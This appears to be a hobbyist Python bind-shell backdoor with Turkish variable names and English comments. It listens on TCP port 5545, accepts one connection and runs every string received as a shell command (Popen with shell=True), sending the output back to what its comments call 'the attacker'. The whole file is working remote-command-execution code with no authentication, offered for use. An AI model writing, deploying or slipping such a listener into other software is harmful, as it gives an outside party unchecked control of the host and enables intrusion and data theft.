from subprocess import *
import socket
from threading import Thread  # we imported requirements


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("",5545)) # We started listening from port 5545 

global res
res = [] # This is our data , when something happen  , program add data in this 

s.listen(1) # how mouch listener we allow 

elma , armut = s.accept() # we wait attacker.elma = client socket and armut is tuple and it insides addr and port e.g ('192.168.56.101',5545)

def cevir(data55): # this is our data I explain in readme.md
    proc = Popen(data55, shell =True, stdout = PIPE ,stderr = PIPE)
    data , data2 = proc.communicate()
    res.append(data)

while True: # this is our loop for what data is processing and gives output and outpt in the res list 
    f = elma.recv(128) # f is attacker's command
    veri = Thread(target = cevir, args=(f,)) # this is thread .I used thread because when I process the code , program throw exception
    veri.start() # thread start
    veri.join()
    veri_f = res[0] # our data e.g whoami is command but $USER is data . this is our data 
    elma.send(veri_f) # we send output to attacker
    res = [] # and res list become empty list
  

s.close() # socket closes 
     


